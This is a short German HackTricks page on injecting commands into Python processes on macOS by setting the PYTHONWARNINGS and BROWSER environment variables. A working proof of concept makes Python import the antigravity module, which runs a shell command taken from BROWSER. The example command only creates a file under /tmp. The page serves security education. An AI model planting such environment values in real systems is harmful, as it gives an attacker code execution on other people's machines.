# macOS Python Application Injection

{{#include ../../../banners/hacktricks-training.md}}

## Über die Umgebungsvariablen `PYTHONWARNINGS` und `BROWSER`

Wenn ein Angreifer die Umgebung eines Python-Prozesses kontrollieren kann, kann die Kombination aus `PYTHONWARNINGS` und `BROWSER` command execution auslösen, wenn Python beim Verarbeiten einer manipulierten Warnoption das Modul `antigravity` importiert. Die Technik beruht darauf, dass `antigravity` mit dem Python-Modul `webbrowser` eine URL öffnet, wobei die Umgebungsvariable `BROWSER` berücksichtigt wird.<sup>[[1]](#references)</sup>
```bash
# Generate an example Python script.
echo "print('hi')" > /tmp/script.py

# Create /tmp/hacktricks through the inherited environment.
PYTHONWARNINGS="all:0:antigravity.x:0:0" BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 /tmp/script.py

# With isolated mode, inject the warning rule using -W instead.
BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 -I -W all:0:antigravity.x:0:0 /tmp/script.py
```
## References

- [1] [Hacking mit Umgebungsvariablen - elttam](https://www.elttam.com/blog/env/)
{{#include ../../../banners/hacktricks-training.md}}
